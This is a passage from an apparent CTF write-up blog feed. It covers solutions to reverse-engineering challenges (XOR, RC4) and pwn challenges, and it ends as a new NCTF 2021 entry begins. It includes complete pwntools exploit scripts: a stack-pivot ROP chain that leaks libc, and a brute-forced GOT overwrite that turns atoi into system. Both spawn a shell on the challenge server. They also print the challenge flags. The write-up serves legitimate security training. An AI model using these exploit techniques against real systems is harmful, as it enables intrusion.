class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br></pre></td><td class="code"><pre><span class="line">flag=[<span class="string">&#x27;?&#x27;</span>]*<span class="number">20</span></span><br><span class="line">flag[<span class="number">11</span>]=<span class="string">&#x27;f&#x27;</span></span><br><span class="line">flag[<span class="number">16</span>]=<span class="string">&#x27;a&#x27;</span></span><br><span class="line">flag[<span class="number">19</span>]=<span class="string">&#x27;9&#x27;</span></span><br><span class="line">flag[<span class="number">10</span>]=<span class="string">&#x27;N&#x27;</span></span><br><span class="line">flag[<span class="number">5</span>]=<span class="string">&#x27;3&#x27;</span></span><br><span class="line">flag[<span class="number">15</span>]=<span class="string">&#x27;n&#x27;</span></span><br><span class="line">flag[<span class="number">16</span>]=<span class="string">&#x27;a&#x27;</span></span><br><span class="line">flag[<span class="number">4</span>]=<span class="string">&#x27;Z&#x27;</span></span><br><span class="line">flag[<span class="number">8</span>]=<span class="string">&#x27;c&#x27;</span></span><br><span class="line">flag[<span class="number">4</span>]=<span class="string">&#x27;Z&#x27;</span></span><br><span class="line">flag[<span class="number">17</span>]=<span class="string">&#x27;W&#x27;</span></span><br><span class="line">flag[<span class="number">11</span>]=<span class="string">&#x27;f&#x27;</span></span><br><span class="line">flag[<span class="number">2</span>]=<span class="string">&#x27;x&#x27;</span></span><br><span class="line">flag[<span class="number">7</span>]=<span class="string">&#x27;u&#x27;</span></span><br><span class="line">flag[<span class="number">9</span>]=<span class="string">&#x27;3&#x27;</span></span><br><span class="line">flag[<span class="number">8</span>]=<span class="string">&#x27;c&#x27;</span></span><br><span class="line">flag[<span class="number">17</span>]=<span class="string">&#x27;W&#x27;</span></span><br><span class="line">flag[<span class="number">11</span>]=<span class="string">&#x27;f&#x27;</span></span><br><span class="line">flag[<span class="number">9</span>]=<span class="string">&#x27;3&#x27;</span></span><br><span class="line">flag[<span class="number">13</span>]=<span class="string">&#x27;G&#x27;</span></span><br><span class="line">flag[<span class="number">11</span>]=<span class="string">&#x27;f&#x27;</span></span><br><span class="line">flag[<span class="number">0</span>]=<span class="string">&#x27;Z&#x27;</span></span><br><span class="line">flag[<span class="number">0</span>]=<span class="string">&#x27;Z&#x27;</span></span><br><span class="line">flag[<span class="number">10</span>]=<span class="string">&#x27;N&#x27;</span></span><br><span class="line">flag[<span class="number">12</span>]=<span class="string">&#x27;b&#x27;</span></span><br><span class="line">flag[<span class="number">1</span>]=<span class="string">&#x27;m&#x27;</span></span><br><span class="line">flag[<span class="number">0</span>]=<span class="string">&#x27;Z&#x27;</span></span><br><span class="line">flag[<span class="number">14</span>]=<span class="string">&#x27;9&#x27;</span></span><br><span class="line">flag[<span class="number">1</span>]=<span class="string">&#x27;m&#x27;</span></span><br><span class="line">flag[<span class="number">0</span>]=<span class="string">&#x27;Z&#x27;</span></span><br><span class="line">flag[<span class="number">16</span>]=<span class="string">&#x27;a&#x27;</span></span><br><span class="line">flag[<span class="number">14</span>]=<span class="string">&#x27;9&#x27;</span></span><br><span class="line">flag[<span class="number">16</span>]=<span class="string">&#x27;a&#x27;</span></span><br><span class="line">flag[<span class="number">13</span>]=<span class="string">&#x27;G&#x27;</span></span><br><span class="line">flag[<span class="number">3</span>]=<span class="string">&#x27;h&#x27;</span></span><br><span class="line">flag[<span class="number">12</span>]=<span class="string">&#x27;b&#x27;</span></span><br><span class="line">flag[<span class="number">11</span>]=<span class="string">&#x27;f&#x27;</span></span><br><span class="line">flag[<span class="number">12</span>]=<span class="string">&#x27;b&#x27;</span></span><br><span class="line">flag[<span class="number">15</span>]=<span class="string">&#x27;n&#x27;</span></span><br><span class="line">flag[<span class="number">3</span>]=<span class="string">&#x27;h&#x27;</span></span><br><span class="line">flag[<span class="number">9</span>]=<span class="string">&#x27;3&#x27;</span></span><br><span class="line">flag[<span class="number">17</span>]=<span class="string">&#x27;W&#x27;</span></span><br><span class="line">flag[<span class="number">5</span>]=<span class="string">&#x27;3&#x27;</span></span><br><span class="line">flag[<span class="number">6</span>]=<span class="string">&#x27;t&#x27;</span></span><br><span class="line">flag[<span class="number">18</span>]=<span class="string">&#x27;5&#x27;</span></span><br><span class="line"><span class="built_in">print</span>(<span class="string">&#x27;&#x27;</span>.join(flag))</span><br><span class="line"><span class="comment"># ZmxhZ3tuc3NfbG9naW59</span></span><br></pre></td></tr></table></figure><p>base64解码得flag：<code>flag&#123;nss_login&#125;</code>。</p><p>​    </p><h2 id="REVERSE"><a href="#REVERSE" class="headerlink" title="REVERSE"></a>REVERSE</h2><h3 id="签到-signin"><a href="#签到-signin" class="headerlink" title="[签到]signin"></a>[签到]signin</h3><blockquote><p>逆向 真 签到题</p></blockquote><p>010editor 16进制查看，搜索出flag：<code>flag&#123;REVERSE_1s_Very_3asy!&#125;</code>。</p><p>​    </p><h3 id="萌新-happyCTF"><a href="#萌新-happyCTF" class="headerlink" title="[萌新]happyCTF"></a>[萌新]happyCTF</h3><p>IDA反编译，发现去了符号，分析代码逻辑，需输入长度24的flag字符串，经 <code>sub_403B70()</code> 函数里逐字符异或0x14后，与字符串 <code>rxusoCqxw&#123;yqK`&#123;KZqag&#123;r`i</code> 比较，相等则通过。</p><p>按异或性质，将字符串与0x14逐字符异或还原flag：<code>flag&#123;Welcome_to_Neusoft&#125;</code>。</p><p>​    </p><h3 id="Remember-Crypt-4"><a href="#Remember-Crypt-4" class="headerlink" title="Remember Crypt 4"></a>Remember Crypt 4</h3><p>从题目就能猜出是RC4，<code>main()</code> 函数代码：</p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br></pre></td><td class="code"><pre><span class="line"><span class="function"><span class="keyword">int</span> __cdecl <span class="title">main</span><span class="params">(<span class="keyword">int</span> argc, <span class="keyword">const</span> <span class="keyword">char</span> **argv, <span class="keyword">const</span> <span class="keyword">char</span> **envp)</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">  <span class="keyword">unsigned</span> <span class="keyword">int</span> v3; <span class="comment">// eax</span></span><br><span class="line">  <span class="keyword">unsigned</span> <span class="keyword">int</span> v4; <span class="comment">// eax</span></span><br><span class="line">  <span class="keyword">void</span> *v5; <span class="comment">// rax</span></span><br><span class="line">  <span class="keyword">void</span> *v7; <span class="comment">// rax</span></span><br><span class="line">  <span class="keyword">int</span> i; <span class="comment">// [rsp+24h] [rbp-D4h]</span></span><br><span class="line">  <span class="keyword">void</span> *v9; <span class="comment">// [rsp+28h] [rbp-D0h]</span></span><br><span class="line">  <span class="keyword">char</span> v10[<span class="number">32</span>]; <span class="comment">// [rsp+30h] [rbp-C8h] BYREF</span></span><br><span class="line">  <span class="keyword">char</span> Str[<span class="number">128</span>]; <span class="comment">// [rsp+50h] [rbp-A8h] BYREF</span></span><br><span class="line"></span><br><span class="line">  <span class="built_in">strcpy</span>(Str, <span class="string">&quot;12345678abcdefghijklmnopqrspxyz&quot;</span>);</span><br><span class="line">  <span class="built_in">memset</span>(&amp;Str[<span class="number">32</span>], <span class="number">0</span>, <span class="number">0x60</span>ui64);</span><br><span class="line">  <span class="built_in">memset</span>(v10, <span class="number">0</span>, <span class="number">0x17</span>ui64);</span><br><span class="line">  sub_1400054D0(<span class="string">&quot;%s&quot;</span>, v10);</span><br><span class="line">  v9 = <span class="built_in">malloc</span>(<span class="number">0x408</span>ui64);</span><br><span class="line">  v3 = <span class="built_in">strlen</span>(Str);</span><br><span class="line">  sub_140001120(v9, Str, v3);</span><br><span class="line">  v4 = <span class="built_in">strlen</span>(v10);</span><br><span class="line">  sub_140001240(v9, v10, v4);</span><br><span class="line">  <span class="keyword">for</span> ( i = <span class="number">0</span>; i &lt; <span class="number">22</span>; ++i )</span><br><span class="line">  &#123;</span><br><span class="line">    <span class="keyword">if</span> ( ((<span class="keyword">unsigned</span> __int8)v10[i] ^ <span class="number">0x22</span>) != byte_14013B000[i] )</span><br><span class="line">    &#123;</span><br><span class="line">      v5 = (<span class="keyword">void</span> *)sub_1400015A0(&amp;off_14013B020, <span class="string">&quot;error&quot;</span>);</span><br><span class="line">      _CallMemberFunction0(v5, sub_140001F10);</span><br><span class="line">      <span class="keyword">return</span> <span class="number">0</span>;</span><br><span class="line">    &#125;</span><br><span class="line">  &#125;</span><br><span class="line">  v7 = (<span class="keyword">void</span> *)sub_1400015A0(&amp;off_14013B020, <span class="string">&quot;nice job&quot;</span>);</span><br><span class="line">  _CallMemberFunction0(v7, sub_140001F10);</span><br><span class="line">  <span class="keyword">return</span> <span class="number">0</span>;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>整体逻辑为，输入字符串经过 <code>sub_140001120()</code> 和 <code>sub_140001240()</code> 函数处理后，与0x22异或，与 <code>byte_14013B000</code> 数组比较。看两函数特征，分别为RC4算法的KSA和PRGA函数，key为 <code>12345678abcdefghijklmnopqrspxyz</code>。</p><p>IDA提取数组hex值：<code>9EE7305FA701A653591B0A20F173D10EAB09840E8D2B0000</code>，Cyberchef FromHex+XOR+RC4一把梭，得到flag：<code>flag&#123;nice_to_meet_you&#125;</code>。</p><p>​    </p><h2 id="PWN"><a href="#PWN" class="headerlink" title="PWN"></a>PWN</h2><h3 id="签到-NssShop"><a href="#签到-NssShop" class="headerlink" title="[签到]NssShop"></a>[签到]NssShop</h3><blockquote><p>nc 47.106.172.144 65002</p><p>真 签到题 不会PWN的同学也可以来试试</p></blockquote><p>nc连接，当前金额为0，选择 <code>1.Buy Item</code>，</p><p>看到flag价格10000，hint价格0，选择 <code>1.Hint:0$</code>，</p><p>回显 <code>Unlimited purchase of items in the shop</code>，说明数量无上限。</p><p>利用int型溢出性质，使得flag单价与数量乘积的总价上溢为负数即可。</p><p>选择 <code>0.Flag:10000$</code>，输入数量111111111，得到flag：<code>flag&#123;Pwn_Is_Vary_Ez&#125;</code>。</p><h3 id="justdoit"><a href="#justdoit" class="headerlink" title="justdoit"></a>justdoit</h3><blockquote><p>nc 47.106.172.144 65004</p></blockquote><p>IDA分析，<code>main()</code> 函数代码：</p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br></pre></td><td class="code"><pre><span class="line"><span class="function"><span class="keyword">int</span> __cdecl <span class="title">main</span><span class="params">(<span class="keyword">int</span> argc, <span class="keyword">const</span> <span class="keyword">char</span> **argv, <span class="keyword">const</span> <span class="keyword">char</span> **envp)</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">  <span class="keyword">char</span> buf[<span class="number">32</span>]; <span class="comment">// [rsp+0h] [rbp-20h] BYREF</span></span><br><span class="line"></span><br><span class="line">  init(argc, argv, envp);</span><br><span class="line">  <span class="built_in">printf</span>(<span class="string">&quot;Hi there! What is your name? &quot;</span>);</span><br><span class="line">  read(<span class="number">0</span>, buf, <span class="number">0x18</span>uLL);</span><br><span class="line">  <span class="built_in">puts</span>(<span class="string">&quot;That is an interesting chall&quot;</span>);</span><br><span class="line">  <span class="built_in">printf</span>(<span class="string">&quot;where are you from? my frends??&quot;</span>);</span><br><span class="line">  read_long();</span><br><span class="line">  <span class="keyword">return</span> <span class="number">0</span>;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p><code>read_long()</code> 函数：</p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><span class="line"><span class="function">__int64 <span class="title">read_long</span><span class="params">()</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">  <span class="keyword">char</span> buf[<span class="number">32</span>]; <span class="comment">// [rsp+0h] [rbp-20h] BYREF</span></span><br><span class="line"></span><br><span class="line">  read(<span class="number">0</span>, buf, <span class="number">0x13</span>uLL);</span><br><span class="line">  <span class="keyword">return</span> atol(buf);</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>从代码看不出有什么利用之处，切换回汇编视图，发现 <code>read_long()</code> 函数在返回rax值时，rbp存在一个加操作：</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br></pre></td><td class="code"><pre><span class="line">.text:00000000004011D5 ; int __cdecl main(int argc, const char **argv, const char **envp)</span><br><span class="line">.text:00000000004011D5                 public main</span><br><span class="line">.text:00000000004011D5 main            proc near               ; DATA XREF: _start+21↑o</span><br><span class="line">.text:00000000004011D5</span><br><span class="line">.text:00000000004011D5 buf             = byte ptr -20h</span><br><span class="line">.text:00000000004011D5</span><br><span class="line">.text:00000000004011D5 ; __unwind &#123;</span><br><span class="line">.text:00000000004011D5                 push    rbp</span><br><span class="line">.text:00000000004011D6                 mov     rbp, rsp</span><br><span class="line">.text:00000000004011D9                 sub     rsp, 20h</span><br><span class="line">.text:00000000004011DD                 mov     eax, 0</span><br><span class="line">.text:00000000004011E2                 call    init</span><br><span class="line">.text:00000000004011E7                 lea     rax, format     ; &quot;Hi there! What is your name? &quot;</span><br><span class="line">.text:00000000004011EE                 mov     rdi, rax        ; format</span><br><span class="line">.text:00000000004011F1                 mov     eax, 0</span><br><span class="line">.text:00000000004011F6                 call    _printf</span><br><span class="line">.text:00000000004011FB                 lea     rax, [rbp+buf]</span><br><span class="line">.text:00000000004011FF                 mov     edx, 18h        ; nbytes</span><br><span class="line">.text:0000000000401204                 mov     rsi, rax        ; buf</span><br><span class="line">.text:0000000000401207                 mov     edi, 0          ; fd</span><br><span class="line">.text:000000000040120C                 call    _read</span><br><span class="line">.text:0000000000401211                 lea     rax, s          ; &quot;That is an interesting chall&quot;</span><br><span class="line">.text:0000000000401218                 mov     rdi, rax        ; s</span><br><span class="line">.text:000000000040121B                 call    _puts</span><br><span class="line">.text:0000000000401220                 lea     rax, aWhereAreYouFro ; &quot;where are you from? my frends??&quot;</span><br><span class="line">.text:0000000000401227                 mov     rdi, rax        ; format</span><br><span class="line">.text:000000000040122A                 mov     eax, 0</span><br><span class="line">.text:000000000040122F                 call    _printf</span><br><span class="line">.text:0000000000401234                 mov     eax, 0</span><br><span class="line">.text:0000000000401239                 call    read_long</span><br><span class="line">.text:000000000040123E                 add     rbp, rax           ; 加操作</span><br><span class="line">.text:0000000000401241                 mov     eax, 0</span><br><span class="line">.text:0000000000401246                 leave</span><br><span class="line">.text:0000000000401247                 retn</span><br><span class="line">.text:0000000000401247 ; &#125; // starts at 4011D5</span><br><span class="line">.text:0000000000401247 main            endp</span><br></pre></td></tr></table></figure><p>接着的 <code>leave</code> 是 <code>mov rsp,rbp; pop rbp</code>，rsp将变为rbp+rax，控制rax为-0x20-8，结合 <code>leave</code> 操作可以将rsp移动到 <code>buf</code> 处以写入ROP链。</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">from</span> pwn <span class="keyword">import</span> *</span><br><span class="line"></span><br><span class="line">binary = context.binary = ELF(<span class="string">&#x27;./justdoit.1&#x27;</span>)</span><br><span class="line"></span><br><span class="line">p = remote(<span class="string">&#x27;47.106.172.144&#x27;</span>, <span class="number">65004</span>)</span><br><span class="line">libc = ELF(<span class="string">&#x27;./libc-2.23.so&#x27;</span>)</span><br><span class="line"></span><br><span class="line">pop_rdi = binary.search(asm(<span class="string">&#x27;pop rdi; ret;&#x27;</span>)).__next__()</span><br><span class="line">pop2 = binary.search(asm(<span class="string">&#x27;pop r14; pop r15; ret;&#x27;</span>)).__next__()</span><br><span class="line"></span><br><span class="line">payload  = <span class="string">b&#x27;&#x27;</span></span><br><span class="line">payload += p64(binary.sym.main)</span><br><span class="line">payload += p64(binary.plt.puts)</span><br><span class="line">payload += p64(binary.sym.main)</span><br><span class="line"></span><br><span class="line">p.sendafter(<span class="string">b&#x27;name? &#x27;</span>, payload)</span><br><span class="line">p.sendafter(<span class="string">b&#x27;frends??&#x27;</span>, <span class="string">b&#x27;-40&#x27;</span>)</span><br><span class="line"></span><br><span class="line">payload  = <span class="string">b&#x27;&#x27;</span></span><br><span class="line">payload += p64(pop_rdi)</span><br><span class="line">payload += p64(binary.got.puts)</span><br><span class="line">payload += p64(pop2)</span><br><span class="line"></span><br><span class="line">p.sendafter(<span class="string">b&#x27;name? &#x27;</span>, payload)</span><br><span class="line">p.sendafter(<span class="string">b&#x27;frends??&#x27;</span>, <span class="string">b&#x27;-40&#x27;</span>)</span><br><span class="line"></span><br><span class="line">libc.address = u64(p.recv(<span class="number">6</span>) + <span class="string">b&#x27;\0\0&#x27;</span>) - libc.sym.puts</span><br><span class="line">log.info(<span class="string">&#x27;libc.address: &#x27;</span> + <span class="built_in">hex</span>(libc.address))</span><br><span class="line"></span><br><span class="line">payload  = <span class="string">b&#x27;&#x27;</span></span><br><span class="line">payload += p64(pop_rdi)</span><br><span class="line">payload += p64(libc.search(<span class="string">b&#x27;/bin/sh&#x27;</span>).__next__())</span><br><span class="line">payload += p64(libc.sym.system)</span><br><span class="line"></span><br><span class="line">p.sendafter(<span class="string">b&#x27;name? &#x27;</span>, payload)</span><br><span class="line">p.sendafter(<span class="string">b&#x27;frends??&#x27;</span>, <span class="string">b&#x27;-40&#x27;</span>)</span><br><span class="line">p.interactive()</span><br></pre></td></tr></table></figure><p>flag：<code>ctf&#123;01241e36-ea17-4bed-b620-f64f10e5c192&#125;</code>。</p><p>​    </p><h3 id="reallNeedGoodLuck"><a href="#reallNeedGoodLuck" class="headerlink" title="reallNeedGoodLuck"></a>reallNeedGoodLuck</h3><blockquote><p>nc 47.106.172.144 65003</p></blockquote><p>IDA分析，<code>main()</code> 函数代码：</p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br></pre></td><td class="code"><pre><span class="line"><span class="function"><span class="keyword">int</span> __cdecl __noreturn <span class="title">main</span><span class="params">(<span class="keyword">int</span> argc, <span class="keyword">const</span> <span class="keyword">char</span> **argv, <span class="keyword">const</span> <span class="keyword">char</span> **envp)</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">  _DWORD *v3; <span class="comment">// [rsp+0h] [rbp-30h]</span></span><br><span class="line">  <span class="keyword">int</span> buf; <span class="comment">// [rsp+Ch] [rbp-24h] BYREF</span></span><br><span class="line">  <span class="keyword">char</span> nptr[<span class="number">24</span>]; <span class="comment">// [rsp+10h] [rbp-20h] BYREF</span></span><br><span class="line">  <span class="keyword">unsigned</span> __int64 v6; <span class="comment">// [rsp+28h] [rbp-8h]</span></span><br><span class="line"></span><br><span class="line">  v6 = __readfsqword(<span class="number">0x28</span>u);</span><br><span class="line">  init(argc, argv, envp);</span><br><span class="line">  <span class="built_in">puts</span>(<span class="string">&quot;need&quot;</span>);</span><br><span class="line">  <span class="built_in">puts</span>(<span class="string">&quot;good&quot;</span>);</span><br><span class="line">  read(<span class="number">0</span>, &amp;buf, <span class="number">4uLL</span>);</span><br><span class="line">  <span class="built_in">puts</span>(<span class="string">&quot;luck! &quot;</span>);</span><br><span class="line">  read(<span class="number">0</span>, nptr, <span class="number">9uLL</span>);</span><br><span class="line">  v3 = (_DWORD *)atoi(nptr);</span><br><span class="line">  *v3 = buf;</span><br><span class="line">  <span class="built_in">exit</span>(<span class="number">0</span>);</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p><code>buf</code> 和 <code>nptr</code> 都无溢出点，但可以向 <code>buf</code> 写入4字节并覆盖掉写入<code>nptr</code>中值对应地址的内容。</p><p>可以任意地址写，考虑将 <code>atoi</code> 改为libc中的 <code>system</code>，再向 <code>system</code> 传入 <code>/bin/sh\x00</code> 即可getshell，为达成两步利用，还需将 <code>exit</code> 改为 <code>main</code> 地址。</p><p><code>atoi</code> 与<code>system</code> 的偏移只有最后2字节不同，又由于ASLR开启，后1.5字节为0，所以有0.5/8=1/16的几率能将 <code>atoi</code> 改为 <code>system</code>。</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">from</span> pwn <span class="keyword">import</span> *</span><br><span class="line"></span><br><span class="line">binary = context.binary = ELF(<span class="string">&#x27;./reallNeedGoodLuck.1&#x27;</span>)</span><br><span class="line"></span><br><span class="line">context.log_level = <span class="string">&#x27;WARN&#x27;</span></span><br><span class="line"></span><br><span class="line">attempt = <span class="number">0</span></span><br><span class="line"><span class="keyword">while</span> <span class="literal">True</span>:</span><br><span class="line">    <span class="keyword">try</span>:</span><br><span class="line">        p = remote(<span class="string">&#x27;47.106.172.144&#x27;</span>, <span class="number">65003</span>)</span><br><span class="line">        libc = ELF(<span class="string">&#x27;./libc-2.23.so&#x27;</span>)</span><br><span class="line">        tout = <span class="number">1.0</span></span><br><span class="line"></span><br><span class="line">        attempt += <span class="number">1</span></span><br><span class="line">        log.warn(<span class="string">&#x27;attempt: &#x27;</span> + <span class="built_in">str</span>(attempt))</span><br><span class="line"></span><br><span class="line">        p.sendafter(<span class="string">b&#x27;good\n&#x27;</span>,p32(binary.sym.main))</span><br><span class="line">        p.sendafter(<span class="string">b&#x27;luck! \n&#x27;</span>,<span class="built_in">str</span>(binary.got.exit).encode())</span><br><span class="line"></span><br><span class="line">        p.sendafter(<span class="string">b&#x27;good\n&#x27;</span>,p32(((libc.sym.system | <span class="number">0xf000</span>) &amp; <span class="number">0xffff</span>) &lt;&lt; <span class="number">16</span>))</span><br><span class="line">        p.sendafter(<span class="string">b&#x27;luck! \n&#x27;</span>,<span class="built_in">str</span>(binary.got.atoi - <span class="number">2</span>).encode())</span><br><span class="line"></span><br><span class="line">        p.sendafter(<span class="string">b&#x27;good\n&#x27;</span>,<span class="string">b&#x27;0000&#x27;</span>,timeout=tout)</span><br><span class="line">        p.sendafter(<span class="string">b&#x27;luck! \n&#x27;</span>,<span class="string">b&#x27;/bin/sh\x00&#x27;</span>,timeout=tout)</span><br><span class="line"></span><br><span class="line">        p.sendline(<span class="string">b&#x27;echo test&#x27;</span>)</span><br><span class="line">        <span class="keyword">if</span> <span class="string">b&#x27;test&#x27;</span> <span class="keyword">in</span> p.recvline(timeout=tout):</span><br><span class="line">            p.interactive()</span><br><span class="line">            <span class="keyword">break</span></span><br><span class="line">    <span class="keyword">except</span> AssertionError <span class="keyword">as</span> err:</span><br><span class="line">        <span class="built_in">print</span>(err)</span><br><span class="line">        sys.exit(<span class="number">1</span>)</span><br><span class="line">    <span class="keyword">except</span>:</span><br><span class="line">        <span class="keyword">try</span>:</span><br><span class="line">            p.close()</span><br><span class="line">        <span class="keyword">except</span>:</span><br><span class="line">            <span class="keyword">continue</span></span><br></pre></td></tr></table></figure><p>flag：<code>ctf&#123;8b1bf41f-8b38-4487-86ae-a5df4fa4c85e&#125;</code>。</p>]]></content>
    
    
      
      
    <summary type="html">&lt;p&gt;​    &lt;/p&gt;
&lt;p&gt;由大连市公安局作为指导单位，大连东软信息学院主办，网络安全工作室承办，大连东软信息学院网络与信息中心、计算机学院、软件学院，品牌发展部、微光网络工作室协办，品牌发展部与微光网络工作室提供设计支持，大连暗泉信息技术有限公司赞助支持的“暗泉杯”网络安全</summary>
      
    
    
    
    <category term="match" scheme="https://lazzzaro.github.io/categories/match/"/>
    
    
    <category term="2021赛" scheme="https://lazzzaro.github.io/tags/2021%E8%B5%9B/"/>
    
  </entry>
  
  <entry>
    <title>NCTF 2021</title>
    <link href="https://lazzzaro.github.io/2021/11/28/match-NCTF-2021/"/>
    <id>https://lazzzaro.github.io/2021/11/28/match-NCTF-2021/</id>
    <published>2021-11-28T12:53:29.000Z</published>
    <updated>2021-11-28T19:29:51.642Z</updated>
    
    <content type="html"><![CDATA[<p>​    </p><ul><li>比赛时间：2021.11.27 9:00-2021.11.28 21:00</li><li>比赛区分校内校外，比赛结束后结算分别排名，比赛时排行榜不区分</li><li>注册队伍登陆后，请在Profile页面绑定队伍成员信息</li><li>每支队伍至少绑定一个成员，不超过4人，校内队伍所有成员请填写<strong>真实姓名</strong>和正确<strong>学号</strong>，校外队伍至少绑定一个成员，以便颁奖时联系。</li><li>未绑定成员信息的队伍可以正常解题但不参与排名</li><li>成员信息一经绑定不可更改</li><li>禁止对平台进行攻击</li><li>禁止与其他队伍交流解题思路</li><li>请在比赛结束后12小时内发送详细解题思路（pdf格式）到邮箱nctf@h4ck.fun</li></ul><p>Rank: 10</p><hr><h2 id="MISC"><a href="#MISC" class="headerlink" title="MISC"></a>MISC</h2><h3 id="Signin"><a href="#Signin" class="headerlink" title="Signin"></a>Signin</h3><blockquote><p>find it</p></blockquote><p>签到，<code>https://nctf.h4ck.fun/challenges/NCTF%7BWelcome_to_NCTF_2021!%7D</code>，链接就有flag：<code>NCTF&#123;Welcome_to_NCTF_2021!&#125;</code>。</p><p>​    </p><h3 id="Hex酱的秘密花园"><a href="#Hex酱的秘密花园" class="headerlink" title="Hex酱的秘密花园"></a>Hex酱的秘密花园</h3><blockquote><p>我们可爱的Hex酱又有了一个强大的功能，可以去执行多行语句惹~<br>但是为了防止有些居心叵测的人，我们专门 把括号，单双引号，都过滤掉，噢对不准色色，所以也不准出现h哟~<br>Ubuntu Python3.6.9<br>快去找Hex酱(QQ:2821876761)私聊吧<br>私聊发送的信息为明文，不需要加base64</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span 